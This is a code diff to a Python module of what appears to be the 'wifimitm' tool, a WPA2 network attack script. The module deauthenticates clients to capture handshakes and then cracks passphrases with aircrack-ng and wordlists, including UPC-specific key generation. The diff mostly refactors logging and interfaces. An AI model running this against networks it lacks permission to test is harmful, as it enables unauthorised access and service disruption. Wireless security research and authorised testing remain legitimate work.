@@ -30,12 +30,11 @@ import subprocess
 import tempfile
 import time
 from enum import Enum, unique
-from io import StringIO
 from typing import List, TextIO
 
 import pkg_resources
 
-from wifimitm.model import WirelessAccessPoint
+from .model import WirelessAccessPoint, WirelessInterface
 from .common import WirelessCapturer, deauthenticate
 
 __author__ = 'Martin Vondracek'
@@ -145,14 +144,16 @@ class Wpa2Cracker(object):
         for line in self.process_stdout_r:
             if 'KEY FOUND!' in line:
                 self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.ascii'))
-                logger.debug('WepCracker found key!')
+                logger.debug('Wpa2Cracker found key!')
             if 'Passphrase not in dictionary' in line:
-                logger.info('Passphrase not in dictionary.')
+                logger.debug('Passphrase not in dictionary.')
                 raise PassphraseNotInDictionaryError()
 
         # check stderr
-        # TODO (xvondr20) Does 'aircrack-ng' ever print anything to stderr?
-        assert self.process_stderr_r.read() == ''
+        if self.process_stderr_r and not self.process_stderr_r.closed:
+            for line in self.process_stderr_r:  # type: str
+                # NOTE: stderr should be empty
+                logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))
 
     def stop(self):
         """
@@ -210,14 +211,16 @@ class Wpa2Cracker(object):
 def get_personalized_dictionaries(target: WirelessAccessPoint) -> List[TextIO]:
     """
     Create and return dictionary personalized by available AP details.
+    :type target: WirelessAccessPoint
     :param target: targeted AP
+
     :rtype: List[TextIO]
     :return: list of opened personalized dictionaries
     """
     dictionaries = []
     if re.match(r'^UPC\d{7}$', target.essid):
         t = pipes.Template()
-        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')  # TODO(xvondr20) 5 GHz?
+        t.prepend('upc_keys {} {}'.format(target.essid, '24'), '.-')
         t.append('grep "  -> WPA2 phrase for "', '--')
         t.append('sed "s/^  -> WPA2 phrase for \S* = \'\(.*\)\'$/\\1/"', '--')
         d = t.open('dictionary-pipeline', 'r')
@@ -231,10 +234,13 @@ class Wpa2Attacker(object):
     Main class providing attack on WPA2 secured network.
     """
 
-    def __init__(self, ap, if_mon):
+    def __init__(self, ap, monitoring_interface: WirelessInterface):
+        """
+        :type monitoring_interface: WirelessInterface
+        :param monitoring_interface: wireless interface for attack
+        """
         self.ap = ap
-        self.if_mon = if_mon
-        self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.
+        self.monitoring_interface = monitoring_interface  # type: WirelessInterface
 
     def start(self, force=False):
         """
@@ -249,37 +255,40 @@ class Wpa2Attacker(object):
             return
         with tempfile.TemporaryDirectory() as tmp_dirname:
             if not self.ap.wpa_handshake_cap_path:
-                capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
+                capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
                 capturer.start(self.ap)
 
-                logger.debug('waiting for the capture result')
-                time.sleep(6)  # TODO(xvondr20) Refactor to wait until AP was detected.
-                # TODO(xvondr20) Refactor to improve following strategy ->
                 while not self.ap.wpa_handshake_cap_path:
                     capturer.update_state()
                     while not capturer.flags['detected_wpa_handshake']:
                         time.sleep(2)
                         capturer.update_state()
-                        tmp_ap = capturer.get_capture_result()[0]
-                        if len(tmp_ap.associated_stations) == 0:
-                            logger.debug('network is empty')
-                        # deauthenticate stations to acquire WPA handshake
-                        for st in tmp_ap.associated_stations:
-                            deauthenticate(self.if_mon, st)
-                            time.sleep(2)
-                            capturer.update_state()
-                            if capturer.flags['detected_wpa_handshake']:
-                                break
+                        result = capturer.get_capture_result()
+                        if len(result):  # if AP was detected by capturer
+                            tmp_ap = capturer.get_capture_result()[0]
+                            if len(tmp_ap.associated_stations) == 0:
+                                logger.info('Network is empty.')
+                            # deauthenticate stations to acquire WPA handshake
+                            for st in tmp_ap.associated_stations:
+                                deauthenticate(self.monitoring_interface, st)
+                                time.sleep(2)
+                                capturer.update_state()
+                                if capturer.flags['detected_wpa_handshake']:
+                                    break
+                        else:
+                            logger.info('Network not detected by capturer yet.')
                     self.ap.save_wpa_handshake_cap(capturer.wpa_handshake_cap_path)
-                    logger.debug('WPA handshake detected')
-                # TODO <-
+                    logger.info('WPA handshake detected.')
                 capturer.stop()
                 capturer.clean()
 
             # prepare dictionaries
             dictionaries = []
             dictionaries += get_personalized_dictionaries(target=self.ap)  # personalized first
-            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/dictionary.lst'))
+            # NOTE: Dictionary 'openwall_all.lst' has been compiled by Solar Designer
+            # of Openwall Project. http://www.openwall.com/wordlists/ License is attached at 'resources/LICENSE'.
+            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/test_dictionary.lst'))
+            dictionaries.append(pkg_resources.resource_stream(__package__, 'resources/openwall_password.lst'))
 
             for idx, dictionary in enumerate(dictionaries):
                 try:
@@ -290,7 +299,7 @@ class Wpa2Attacker(object):
                         logger.debug('Wpa2Cracker: ' + str(cracker.state))
                         time.sleep(5)
                 except PassphraseNotInDictionaryError:
-                    print('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
+                    logger.info('Passphrase not in dictionary. ({}/{})'.format(idx + 1, len(dictionaries)))
                 finally:
                     cracker.stop()
                     cracker.clean()
@@ -310,10 +319,12 @@ class Wpa2Attacker(object):
 
 
 def verify_psk(ap: WirelessAccessPoint, psk: str):
-    one_word_dictionary = StringIO(psk)
+    dictionary_w = tempfile.NamedTemporaryFile(mode='w', prefix='dictionary')
+    dictionary_w.write(psk)
+    dictionary_w.flush()
+    dictionary_r = open(dictionary_w.name, 'r')
 
-    cracker = Wpa2Cracker(ap=ap, dictionary=one_word_dictionary)
-    result = False
+    cracker = Wpa2Cracker(ap=ap, dictionary=dictionary_r)
     try:
         cracker.start()
         while not ap.is_cracked():
@@ -328,5 +339,6 @@ def verify_psk(ap: WirelessAccessPoint, psk: str):
     finally:
         cracker.stop()
         cracker.clean()
-        one_word_dictionary.close()
+        dictionary_r.close()
+        dictionary_w.close()
     return result
